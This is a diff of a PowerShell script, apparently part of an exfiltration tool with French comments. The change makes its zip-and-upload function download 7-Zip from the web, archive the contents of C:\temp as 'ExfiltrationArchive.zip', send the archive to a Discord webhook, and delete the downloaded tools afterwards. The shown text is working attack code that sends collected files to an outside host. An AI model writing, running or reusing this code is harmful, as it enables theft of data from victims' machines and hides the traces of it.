@@ -47,7 +47,7 @@ function Upload-Discord {
 }
 
 
-# Function to create a zip archive and upload to Discord
+# Function to create a zip archive using 7-Zip and upload to Discord
 function ZipAndUploadToDiscord {
     param (
         [string]$sourcePath,
@@ -56,29 +56,26 @@ function ZipAndUploadToDiscord {
         [string]$discordMessage
     )
 
-    # Function to create a zip archive
-    function Create-ZipArchive {
-        param (
-            [string]$ZipSourcePath,
-            [string]$zipFilePath
-        )
-
-        Add-Type -AssemblyName System.IO.Compression.FileSystem
-        [System.IO.Compression.ZipFile]::CreateFromDirectory($ZipSourcePath, $zipFilePath)
-    }
-
     # Déclarer ou assigner les valeurs de ces variables
     $sourcePath = "C:\temp"
     $zipFilePath = "C:\temp\ExfiltrationArchive.zip"
     $discordMessage = "Exfiltration Archive"
 
-    # Call Create-ZipArchive to create the zip archive
-    Create-ZipArchive -ZipSourcePath $sourcePath -zipFilePath $zipFilePath
+    # Download 7-Zip
+    Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
+
+    # Unzip 7-Zip
+    Expand-Archive -Path .\7z.zip -DestinationPath .\7z -Force
+
+    # Create a zip archive using 7-Zip
+    .\7z\7za.exe a -tzip "$zipFilePath" "$sourcePath\*" -r
 
     # Call Upload-Discord to send the zip archive to Discord
     Upload-Discord -file $zipFilePath -text $discordMessage -discordUrl $discordUrl
-}
 
+    # Cleanup: Remove 7-Zip files
+    Remove-Item -Path .\7z.zip, .\7z -Recurse -Force
+}
 
 
 # Créer un scriptblock pour la fonction Exfiltration
